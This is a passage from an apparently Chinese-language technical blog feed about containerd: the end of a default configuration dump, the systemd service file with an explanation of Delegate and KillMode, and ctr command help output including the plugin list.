class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.headers]<br><br>      [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.mirrors]<br><br>    [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.x509_key_pair_streaming]<br>      tls_cert_file = <span class="hljs-string">&quot;&quot;</span><br>      tls_key_file = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.internal.v1.opt&quot;</span>]<br>    path = <span class="hljs-string">&quot;/opt/containerd&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.internal.v1.restart&quot;</span>]<br>    interval = <span class="hljs-string">&quot;10s&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.internal.v1.tracing&quot;</span>]<br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.metadata.v1.bolt&quot;</span>]<br>    content_sharing_policy = <span class="hljs-string">&quot;shared&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.monitor.v1.cgroups&quot;</span>]<br>    no_prometheus = <span class="hljs-literal">false</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.nri.v1.nri&quot;</span>]<br>    <span class="hljs-built_in">disable</span> = <span class="hljs-literal">true</span><br>    disable_connections = <span class="hljs-literal">false</span><br>    plugin_config_path = <span class="hljs-string">&quot;/etc/nri/conf.d&quot;</span><br>    plugin_path = <span class="hljs-string">&quot;/opt/nri/plugins&quot;</span><br>    plugin_registration_timeout = <span class="hljs-string">&quot;5s&quot;</span><br>    plugin_request_timeout = <span class="hljs-string">&quot;2s&quot;</span><br>    socket_path = <span class="hljs-string">&quot;/var/run/nri/nri.sock&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.runtime.v1.linux&quot;</span>]<br>    no_shim = <span class="hljs-literal">false</span><br>    runtime = <span class="hljs-string">&quot;runc&quot;</span><br>    runtime_root = <span class="hljs-string">&quot;&quot;</span><br>    shim = <span class="hljs-string">&quot;containerd-shim&quot;</span><br>    shim_debug = <span class="hljs-literal">false</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.runtime.v2.task&quot;</span>]<br>    platforms = [<span class="hljs-string">&quot;linux/amd64&quot;</span>]<br>    sched_core = <span class="hljs-literal">false</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.service.v1.diff-service&quot;</span>]<br>    default = [<span class="hljs-string">&quot;walking&quot;</span>]<br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.service.v1.tasks-service&quot;</span>]<br>    blockio_config_file = <span class="hljs-string">&quot;&quot;</span><br>    rdt_config_file = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.snapshotter.v1.aufs&quot;</span>]<br>    root_path = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.snapshotter.v1.blockfile&quot;</span>]<br>    fs_type = <span class="hljs-string">&quot;&quot;</span><br>    mount_options = []<br>    root_path = <span class="hljs-string">&quot;&quot;</span><br>    scratch_file = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.snapshotter.v1.btrfs&quot;</span>]<br>    root_path = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.snapshotter.v1.devmapper&quot;</span>]<br>    async_remove = <span class="hljs-literal">false</span><br>    base_image_size = <span class="hljs-string">&quot;&quot;</span><br>    discard_blocks = <span class="hljs-literal">false</span><br>    fs_options = <span class="hljs-string">&quot;&quot;</span><br>    fs_type = <span class="hljs-string">&quot;&quot;</span><br>    pool_name = <span class="hljs-string">&quot;&quot;</span><br>    root_path = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.snapshotter.v1.native&quot;</span>]<br>    root_path = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.snapshotter.v1.overlayfs&quot;</span>]<br>    mount_options = []<br>    root_path = <span class="hljs-string">&quot;&quot;</span><br>    sync_remove = <span class="hljs-literal">false</span><br>    upperdir_label = <span class="hljs-literal">false</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.snapshotter.v1.zfs&quot;</span>]<br>    root_path = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.tracing.processor.v1.otlp&quot;</span>]<br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.transfer.v1.local&quot;</span>]<br>    config_path = <span class="hljs-string">&quot;&quot;</span><br>    max_concurrent_downloads = 3<br>    max_concurrent_uploaded_layers = 3<br><br>    [[plugins.<span class="hljs-string">&quot;io.containerd.transfer.v1.local&quot;</span>.unpack_config]]<br>      differ = <span class="hljs-string">&quot;&quot;</span><br>      platform = <span class="hljs-string">&quot;linux/amd64&quot;</span><br>      snapshotter = <span class="hljs-string">&quot;overlayfs&quot;</span><br><br>[proxy_plugins]<br><br>[stream_processors]<br><br>  [stream_processors.<span class="hljs-string">&quot;io.containerd.ocicrypt.decoder.v1.tar&quot;</span>]<br>    accepts = [<span class="hljs-string">&quot;application/vnd.oci.image.layer.v1.tar+encrypted&quot;</span>]<br>    args = [<span class="hljs-string">&quot;--decryption-keys-path&quot;</span>, <span class="hljs-string">&quot;/etc/containerd/ocicrypt/keys&quot;</span>]<br>    <span class="hljs-built_in">env</span> = [<span class="hljs-string">&quot;OCICRYPT_KEYPROVIDER_CONFIG=/etc/containerd/ocicrypt/ocicrypt_keyprovider.conf&quot;</span>]<br>    path = <span class="hljs-string">&quot;ctd-decoder&quot;</span><br>    returns = <span class="hljs-string">&quot;application/vnd.oci.image.layer.v1.tar&quot;</span><br><br>  [stream_processors.<span class="hljs-string">&quot;io.containerd.ocicrypt.decoder.v1.tar.gzip&quot;</span>]<br>    accepts = [<span class="hljs-string">&quot;application/vnd.oci.image.layer.v1.tar+gzip+encrypted&quot;</span>]<br>    args = [<span class="hljs-string">&quot;--decryption-keys-path&quot;</span>, <span class="hljs-string">&quot;/etc/containerd/ocicrypt/keys&quot;</span>]<br>    <span class="hljs-built_in">env</span> = [<span class="hljs-string">&quot;OCICRYPT_KEYPROVIDER_CONFIG=/etc/containerd/ocicrypt/ocicrypt_keyprovider.conf&quot;</span>]<br>    path = <span class="hljs-string">&quot;ctd-decoder&quot;</span><br>    returns = <span class="hljs-string">&quot;application/vnd.oci.image.layer.v1.tar+gzip&quot;</span><br><br>[timeouts]<br>  <span class="hljs-string">&quot;io.containerd.timeout.bolt.open&quot;</span> = <span class="hljs-string">&quot;0s&quot;</span><br>  <span class="hljs-string">&quot;io.containerd.timeout.metrics.shimstats&quot;</span> = <span class="hljs-string">&quot;2s&quot;</span><br>  <span class="hljs-string">&quot;io.containerd.timeout.shim.cleanup&quot;</span> = <span class="hljs-string">&quot;5s&quot;</span><br>  <span class="hljs-string">&quot;io.containerd.timeout.shim.load&quot;</span> = <span class="hljs-string">&quot;5s&quot;</span><br>  <span class="hljs-string">&quot;io.containerd.timeout.shim.shutdown&quot;</span> = <span class="hljs-string">&quot;3s&quot;</span><br>  <span class="hljs-string">&quot;io.containerd.timeout.task.state&quot;</span> = <span class="hljs-string">&quot;2s&quot;</span><br><br>[ttrpc]<br>  address = <span class="hljs-string">&quot;&quot;</span><br>  gid = 0<br>  uid = 0<br></code></pre></td></tr></table></figure><h2 id="查看service文件"><a href="#查看service文件" class="headerlink" title="查看service文件"></a>查看service文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># cat /etc/systemd/system/containerd.service</span><br><span class="hljs-comment"># Copyright The containerd Authors.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="hljs-comment"># you may not use this file except in compliance with the License.</span><br><span class="hljs-comment"># You may obtain a copy of the License at</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#     http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Unless required by applicable law or agreed to in writing, software</span><br><span class="hljs-comment"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="hljs-comment"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="hljs-comment"># See the License for the specific language governing permissions and</span><br><span class="hljs-comment"># limitations under the License.</span><br><br>[Unit]<br>Description=containerd container runtime<br>Documentation=https://containerd.io<br>After=network.target local-fs.target<br><br>[Service]<br><span class="hljs-comment">#uncomment to enable the experimental sbservice (sandboxed) version of containerd/cri integration</span><br><span class="hljs-comment">#Environment=&quot;ENABLE_CRI_SANDBOXES=sandboxed&quot;</span><br>ExecStartPre=-/sbin/modprobe overlay<br>ExecStart=/usr/local/bin/containerd<br><br>Type=notify<br>Delegate=<span class="hljs-built_in">yes</span><br>KillMode=process<br>Restart=always<br>RestartSec=5<br><span class="hljs-comment"># Having non-zero Limit*s causes performance problems due to accounting overhead</span><br><span class="hljs-comment"># in the kernel. We recommend using cgroups to do container-local accounting.</span><br>LimitNPROC=infinity<br>LimitCORE=infinity<br>LimitNOFILE=infinity<br><span class="hljs-comment"># Comment TasksMax if your systemd version does not supports it.</span><br><span class="hljs-comment"># Only systemd 226 and above support this version.</span><br>TasksMax=infinity<br>OOMScoreAdjust=-999<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><p>注意以下两点：<br>1）Delegate：该选项是为了允许containerd以及运行时管理自己创建容器的cgroups。<br>如果该值为no，则systemd就会将进程移到自己的cgroups中，从而导致containerd无法正确管理容器的cgroups以及正常获取容器的资源使用情况。<br>2）KillMode：该值用来设置systemd单元进程（即containerd进程）被杀死的方式，默认值是control-group，默认情况下systemd会在进程的cgroup中查找并杀死containerd的所有子进程。<br>KillMode字段可以设置的值如下：</p><ul><li>control-group（默认值）：当前控制组里面的所有子进程都会被杀掉。</li><li>process：只杀主进程；</li><li>mixed：主进程将收到SIGTERM信号，子进程收到SIGKILL信号。</li><li>none：没有进程被杀掉，只是执行服务的stop命令。<br><font color=red>containerd将KillMode的值设置为process，这样可以确保升级或重启containerd时不杀死现有的容器。</font></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【containerd】(202407) 05.containerd核心组件解析</title>
    <link href="/2024/07/29/containerd/%E3%80%90containerd%E3%80%91(202407)%2005.containerd%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6%E8%A7%A3%E6%9E%90/"/>
    <url>/2024/07/29/containerd/%E3%80%90containerd%E3%80%91(202407)%2005.containerd%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="第7章-containerd核心组件解析"><a href="#第7章-containerd核心组件解析" class="headerlink" title="第7章 containerd核心组件解析"></a>第7章 containerd核心组件解析</h1><h2 id="7-2-containerd-API和core"><a href="#7-2-containerd-API和core" class="headerlink" title="7.2 containerd API和core"></a>7.2 containerd API和core</h2><h3 id="7-2-1-GRPC-API"><a href="#7-2-1-GRPC-API" class="headerlink" title="7.2.1 GRPC API"></a>7.2.1 GRPC API</h3><p>不同于nerdctl和crictl，ctr提供的基本是containerd GRPC接口的原生能力。</p><p>containerd GRPC API的定义在目录<code>containerd\api\services</code>中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 open-source]<span class="hljs-comment"># ctr -h</span><br>NAME:<br>   ctr - <br>        __<br>  _____/ /______<br> / ___/ __/ ___/<br>/ /__/ /_/ /<br>\___/\__/_/<br><br>containerd CLI<br><br><br>USAGE:<br>   ctr [global options] <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>VERSION:<br>   v1.7.18<br><br>DESCRIPTION:<br>   <br>ctr is an unsupported debug and administrative client <span class="hljs-keyword">for</span> interacting<br>with the containerd daemon. Because it is unsupported, the commands,<br>options, and operations are not guaranteed to be backward compatible or<br>stable from release to release of the containerd project.<br><br>COMMANDS:<br>   plugins, plugin            Provides information about containerd plugins<br>   version                    Print the client and server versions<br>   containers, c, container   Manage containers<br>   content                    Manage content<br>   events, event              Display containerd events<br>   images, image, i           Manage images<br>   leases                     Manage leases<br>   namespaces, namespace, ns  Manage namespaces<br>   pprof                      Provide golang pprof outputs <span class="hljs-keyword">for</span> containerd<br>   run                        Run a container<br>   snapshots, snapshot        Manage snapshots<br>   tasks, t, task             Manage tasks<br>   install                    Install a new package<br>   oci                        OCI tools<br>   sandboxes, sandbox, sb, s  Manage sandboxes<br>   info                       Print the server info<br>   deprecations               <br>   shim                       Interact with a shim directly<br>   <span class="hljs-built_in">help</span>, h                    Shows a list of commands or <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> one <span class="hljs-built_in">command</span><br><br>GLOBAL OPTIONS:<br>   --debug                      Enable debug output <span class="hljs-keyword">in</span> logs<br>   --address value, -a value    Address <span class="hljs-keyword">for</span> containerd<span class="hljs-string">&#x27;s GRPC server (default: &quot;/run/containerd/containerd.sock&quot;) [$CONTAINERD_ADDRESS]</span><br><span class="hljs-string">   --timeout value              Total timeout for ctr commands (default: 0s)</span><br><span class="hljs-string">   --connect-timeout value      Timeout for connecting to containerd (default: 0s)</span><br><span class="hljs-string">   --namespace value, -n value  Namespace to use with commands (default: &quot;default&quot;) [$CONTAINERD_NAMESPACE]</span><br><span class="hljs-string">   --help, -h                   show help</span><br><span class="hljs-string">   --version, -v                print the version</span><br></code></pre></td></tr></table></figure><h4 id="container"><a href="#container" class="headerlink" title="container"></a>container</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 open-source]<span class="hljs-comment"># ctr container -h</span><br>NAME:<br>   ctr containers - Manage containers<br><br>USAGE:<br>   ctr containers <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   create                   Create container<br>   delete, del, remove, <span class="hljs-built_in">rm</span>  Delete one or more existing containers<br>   info                     Get info about a container<br>   list, <span class="hljs-built_in">ls</span>                 List containers<br>   label                    Set and clear labels <span class="hljs-keyword">for</span> a container<br>   checkpoint               Checkpoint a container<br>   restore                  Restore a container from checkpoint<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br>   <br>[root@ubuntu-22 open-source]<span class="hljs-comment"># </span><br>[root@ubuntu-22 open-source]<span class="hljs-comment"># ctr c -h</span><br>NAME:<br>   ctr containers - Manage containers<br><br>USAGE:<br>   ctr containers <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   create                   Create container<br>   delete, del, remove, <span class="hljs-built_in">rm</span>  Delete one or more existing containers<br>   info                     Get info about a container<br>   list, <span class="hljs-built_in">ls</span>                 List containers<br>   label                    Set and clear labels <span class="hljs-keyword">for</span> a container<br>   checkpoint               Checkpoint a container<br>   restore                  Restore a container from checkpoint<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><h4 id="content"><a href="#content" class="headerlink" title="content"></a>content</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 open-source]<span class="hljs-comment"># ctr content -h</span><br>NAME:<br>   ctr content - Manage content<br><br>USAGE:<br>   ctr content <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   active                   Display active transfers<br>   delete, del, remove, <span class="hljs-built_in">rm</span>  Permanently delete one or more blobs<br>   edit                     Edit a blob and <span class="hljs-built_in">return</span> a new digest<br>   fetch                    Fetch all content <span class="hljs-keyword">for</span> an image into containerd<br>   fetch-object             Retrieve objects from a remote<br>   fetch-blob               Retrieve blobs from a remote<br>   get                      Get the data <span class="hljs-keyword">for</span> an object<br>   ingest                   Accept content into the store<br>   list, <span class="hljs-built_in">ls</span>                 List all blobs <span class="hljs-keyword">in</span> the store<br>   push-object              Push an object to a remote<br>   label                    Add labels to content<br>   prune                    Prunes content from the content store<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br>   <br>[root@ubuntu-22 open-source]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h4 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 open-source]<span class="hljs-comment"># ctr snapshots diff -h</span><br>NAME:<br>   ctr snapshots diff - Get the diff of two snapshots. the default second snapshot is the first snapshot<span class="hljs-string">&#x27;s parent.</span><br><span class="hljs-string"></span><br><span class="hljs-string">USAGE:</span><br><span class="hljs-string">   ctr snapshots diff [command options] [flags] &lt;idA&gt; [&lt;idB&gt;]</span><br><span class="hljs-string"></span><br><span class="hljs-string">OPTIONS:</span><br><span class="hljs-string">   --media-type value  Media type to use for creating diff (default: &quot;application/vnd.oci.image.layer.v1.tar+gzip&quot;)</span><br><span class="hljs-string">   --ref value         Content upload reference to use</span><br><span class="hljs-string">   --keep              Keep diff content. up to creator to delete it.</span><br><span class="hljs-string">   --label value       Labels to attach to the image</span><br><span class="hljs-string">   </span><br><span class="hljs-string">[root@ubuntu-22 open-source]# </span><br><span class="hljs-string">[root@ubuntu-22 open-source]# </span><br></code></pre></td></tr></table></figure><h4 id="event"><a href="#event" class="headerlink" title="event"></a>event</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 open-source]<span class="hljs-comment"># ctr event -h</span><br>NAME:<br>   ctr events - Display containerd events<br><br>USAGE:<br>   ctr events [arguments...]<br>[root@ubuntu-22 open-source]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h4 id="image"><a href="#image" class="headerlink" title="image"></a>image</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr image -h</span><br>NAME:<br>   ctr images - Manage images<br><br>USAGE:<br>   ctr images <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   check                    Check existing images to ensure all content is available locally<br>   <span class="hljs-built_in">export</span>                   Export images<br>   import                   Import images<br>   list, <span class="hljs-built_in">ls</span>                 List images known to containerd<br>   mount                    Mount an image to a target path<br>   unmount                  Unmount the image from the target<br>   pull                     Pull an image from a remote<br>   push                     Push an image to a remote<br>   prune                    Remove unused images<br>   delete, del, remove, <span class="hljs-built_in">rm</span>  Remove one or more images by reference<br>   tag                      Tag an image<br>   label                    Set and clear labels <span class="hljs-keyword">for</span> an image<br>   convert                  Convert an image<br>   usage                    Display usage of snapshots <span class="hljs-keyword">for</span> a given image ref<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><h4 id="introspection"><a href="#introspection" class="headerlink" title="introspection"></a>introspection</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr info</span><br>&#123;<br>    <span class="hljs-string">&quot;server&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;uuid&quot;</span>: <span class="hljs-string">&quot;64bd2d8f-d225-40aa-82fd-874a0a06032b&quot;</span>,<br>        <span class="hljs-string">&quot;pid&quot;</span>: 939,<br>        <span class="hljs-string">&quot;pidns&quot;</span>: 4026531836<br>    &#125;<br>&#125;<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># ps -ef |grep 939</span><br>root         939       1  0 20:48 ?        00:00:00 /usr/local/bin/containerd<br>root        3492    2363  0 20:50 pts/0    00:00:00 grep --color=auto 939<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr plugin ls</span><br>TYPE                                   ID                       PLATFORMS      STATUS    <br>io.containerd.snapshotter.v1           aufs                     linux/amd64    skip      <br>io.containerd.event.v1                 exchange                 -              ok        <br>io.containerd.internal.v1              opt                      -              ok        <br>io.containerd.warning.v1               deprecations             -              ok        <br>io.containerd.snapshotter.v1           blockfile                linux/amd64    skip      <br>io.containerd.snapshotter.v1           btrfs                    linux/amd64    skip      <br>io.containerd.snapshotter.v1           devmapper                linux/amd64    error     <br>io.containerd.snapshotter.v1           native                   linux/amd64    ok        <br>io.containerd.snapshotter.v1           overlayfs                linux/amd64    ok        <br>io.containerd.snapshotter.v1           zfs                      linux/amd64    skip      <br>io.containerd.content.v1               content                  -              ok        <br>io.containerd.metadata.v1              bolt                     -              ok        <br>io.containerd.gc.v1                    scheduler                -              ok        <br>io.containerd.differ.v1                walking                  linux/amd64    ok        <br>io.containerd.lease.v1                 manager                  -              ok        <br>io.containerd.streaming.v1             manager                  -              ok        <br>io.containerd.runtime.v1               linux                    linux/amd64    ok        <br>io.containerd.monitor.v1               cgroups                  linux/amd64    ok        <br>io.containerd.runtime.v2               task                     linux/amd64    ok        <br>io.containerd.runtime.v2               shim                     -              ok        <br>io.containerd.sandbox.store.v1         <span class="hljs-built_in">local</span>                    -              ok        <br>io.containerd.sandbox.controller.v1    <span class="hljs-built_in">local</span>                    -              ok        <br>io.containerd.service.v1               containers-service       -              ok        <br>io.containerd.service.v1               content-service          -              ok        <br>io.containerd.service.v1               diff-service             -              ok        <br>io.containerd.service.v1               images-service           -              ok        <br>io.containerd.service.v1               introspection-service    -              ok        <br>io.containerd.service.v1               namespaces-service       -              ok        <br>io.containerd.service.v1               snapshots-service        -              ok        <br>io.containerd.service.v1               tasks-service            -              ok        <br>io.containerd.grpc.v1                  containers               -              ok        <br>io.containerd.grpc.v1                  content                  -              ok        <br>io.containerd.grpc.v1                  diff                     -              ok        <br>io.containerd.grpc.v1                  events                   -              ok        <br>io.containerd.grpc.v1                  images                   -              ok        <br>io.containerd.grpc.v1                  introspection            -              ok        <br>io.containerd.grpc.v1                  leases                   -              ok        <br>io.containerd.grpc.v1                  namespaces               -              ok        <br>io.containerd.grpc.v1                  sandbox-controllers      -              ok        <br>io.containerd.grpc.v1                  sandboxes                -              ok        <br>io.containerd.grpc.v1                  snapshots                -              ok        <br>io.containerd.grpc.v1                  streaming                -              ok        <br>io.containerd.grpc.v1                  tasks                    -              ok        <br>io.containerd.transfer.v1              <span class="hljs-built_in">local</span>                    -              ok        <br>io.containerd.grpc.v1                  transfer                 -              ok        <br>io.containerd.grpc.v1                  version                  -              ok        <br>io.containerd.internal.v1              restart                  -              ok        <br>io.containerd.tracing.processor.v1     otlp                     -              skip      <br>io.containerd.internal.v1              tracing                  -              skip      <br>io.containerd.grpc.v1                  healthcheck              -              ok        <br>io.containerd.nri.v1                   nri                      -              ok        <br>io.containerd.grpc.v1                  cri                      linux/amd64    ok        <br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h4 id="leases"><a href="#leases" class="headerlink" title="leases"></a>leases</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 